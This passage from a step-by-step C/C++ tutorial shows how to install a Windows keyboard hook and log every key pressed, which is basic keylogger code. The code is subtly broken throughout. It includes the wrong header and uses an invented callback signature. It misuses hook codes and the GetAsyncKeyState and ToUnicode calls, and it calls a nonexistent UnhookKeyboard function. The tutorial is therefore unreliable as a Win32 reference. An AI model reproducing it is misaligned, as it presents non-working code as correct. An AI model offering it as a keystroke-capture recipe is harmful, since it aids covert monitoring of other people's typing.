#include <User32.h>
#include <iostream>
using namespace std;
```

### Step 2: Define the Callback Function
Define a function to handle keyboard events:
```c
void CALLBACK KeyPress(int hwnd, int nCode, UINT state, int extraInfo, DWORD dwTime, DWORD dwParam2, int dwReserved);
```

### Step 3: Implement the Callback Function
```c
void CALLBACK KeyPress(int hwnd, int nCode, UINT state, int extraInfo, DWORD dwTime, DWORD dwParam2, int dwReserved) {
    if (nCode == HC_KEYDOWN) {
        // Key is pressed
        // Get the key state
        byte keys = GetAsyncKeyState(0x7F);
        for (int i = 0; i < 0x7F; i++) {
            if (keys & (1 << i)) {
                char key = ToUnicode(i);
                // Log the key press
                cout << "Key pressed: " << key << endl;
            }
        }
    } else if (nCode == HC_KEYUP) {
        // Key is released
        // No action needed for logging, just release the hook later
    }
}
```

### Step 4: Install the Keyboard Hook
```c
int main() {
    // Install the hook
    int hhook = SetWindowsHook(WH_KEYBOARD, KeyPress);

    // Run the program
    cout << "Keyboard hook installed. Press any key to continue." << endl;
    while (true) {
        // Wait for input
        int c = getchar();
        if (c == EOF) {
            break;
        }
    }

    // Uninstall the hook
    if (UnhookKeyboard(hhook)) {
        cout << "Keyboard hook removed." << endl;
    } else {
        cout << "Failed to remove keyboard hook." << endl;
    }

    return 0;
}
```

